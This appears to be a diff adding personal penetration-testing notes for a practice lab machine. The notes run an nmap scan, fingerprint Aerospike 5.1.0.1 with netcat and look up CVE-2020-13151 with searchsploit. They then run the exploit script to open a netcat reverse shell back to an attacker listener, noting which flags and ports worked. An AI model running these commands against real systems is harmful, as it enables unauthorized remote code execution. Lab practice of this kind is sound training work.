@@ -1,0 +1,56 @@
+$ sudo nmap -sCV -p- -v -Pn --open 192.168.157.143 > 143.txt
+PORT     STATE SERVICE    VERSION
+21/tcp   open  ftp        vsftpd 3.0.3
+22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 23:4c:6f:ff:b8:52:29:65:3d:d1:4e:38:eb:fe:01:c1 (RSA)
+|   256 0d:fd:36:d8:05:69:83:ef:ae:a0:fe:4b:82:03:32:ed (ECDSA)
+|_  256 cc:76:17:1e:8e:c5:57:b2:1f:45:28:09:05:5a:eb:39 (ED25519)
+80/tcp   open  http       Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Apache2 Ubuntu Default Page: It works
+| http-methods: 
+|_  Supported Methods: GET POST OPTIONS HEAD
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+81/tcp   open  http       Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Test Page for the Nginx HTTP Server on Fedora
+| http-methods: 
+|_  Supported Methods: GET POST OPTIONS HEAD
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+443/tcp  open  http       Apache httpd 2.4.41
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+| http-methods: 
+|_  Supported Methods: GET POST OPTIONS HEAD
+|_http-title: Apache2 Ubuntu Default Page: It works
+3000/tcp open  ppp?
+3001/tcp open  nessus?
+3003/tcp open  cgms?
+3306/tcp open  mysql      MySQL (unauthorized)
+5432/tcp open  postgresql PostgreSQL DB 12.9 - 12.13
+| ssl-cert: Subject: commonName=aero
+| Subject Alternative Name: DNS:aero
+| Issuer: commonName=aero
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2021-05-10T22:20:48
+| Not valid after:  2031-05-08T22:20:48
+| MD5:   0cbe:58c4:2d38:4109:72c9:e3c4:fe39:ca8d
+|_SHA-1: ad85:4984:c180:ba73:e010:83f8:c44f:18b9:d176:2fd8
+|_ssl-date: TLS randomness does not represent time
+Service Info: Host: 127.0.0.2; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+$ nc -nv 192.168.157.143 3003
+(UNKNOWN) [192.168.157.143] 3003 (?) open
+version
+Aerospike Community Edition build 5.1.0.1
+$ searchsploit aero
+Aerospike Database 5.1.0.3 - OS Command Execution       | multiple/remote/49067.py
+get this exploit py file.
+$ python3 cve2020-13151.py --ahost 192.168.157.143 --aport 3003 --netcatshell --lhost 192.168.45.201 --lport 4444  # not working 
+
+$ python3 cve2020-13151.py --ahost 192.168.157.143 --udfpath poc.lua --netcatshell --lhost 192.168.45.201 --lport 443 
+# this work, no indicate aport 3003 and listener port cannot be 4444
+
+
+
+
